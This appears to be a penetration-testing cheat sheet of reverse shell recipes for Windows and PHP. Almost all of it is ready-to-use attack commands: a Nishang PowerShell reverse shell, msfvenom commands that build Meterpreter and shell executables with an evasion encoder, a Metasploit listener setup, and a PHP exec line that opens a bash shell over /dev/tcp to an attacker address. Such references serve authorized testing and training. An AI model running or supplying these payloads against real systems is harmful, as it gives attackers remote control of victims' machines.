# Reverse Shells

* [Nishang Invoke PowerShell TCP](#nishang-invoke-powershell-tcp)
* [Windows Meterpreter Reverse Shell](#windows-meterpreter-reverse-shell)

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket charactors themselves [ ] require removal. See examples.
*********************************************************************************

## Nishang Invoke PowerShell TCP

1. Paste this nishang file into a blank text document: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
2. Name it "Invoke-PowerShellTcp.ps1" (remove quotes)
3. Transfer the newly created file to the target machine by any means
4. Have the target machine trigger this command:
```
Invoke-PowerShellTcp -Reverse -IPAddress [ATTACK-IP] -Port [PORT]
```
Example: 
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.66.69 -Port 8686
```
********************************************************************************
## Windows Meterpreter Reverse Shell

1. Use this command to create a Windows Meterpreter reverse shell: 
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[ATTACK-IP] LPORT=[PORT] -f exe -o [OUTPUT-FILE]
```
Example: 
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.66.69 LPORT=8686 -f exe -o exploit.exe
```

2. Transfer the file to target machine by any means
3. Start the listener on attack machine:
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST [attack-ip] 
set LPORT [listening-port] 
run
```
********************************************************************************
Another way to generate a reverse shell as an Windows executable:
```
msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -e x86/shikata_ga_nai -f exe-service -o [FILE]
```
********************************************************************************
## PHP Reverse Shell Listener
```
exec("/bin/bash -c 'bash -i >& /dev/tcp/[ATTACK-IP]/[PORT] 0>&1'")
```
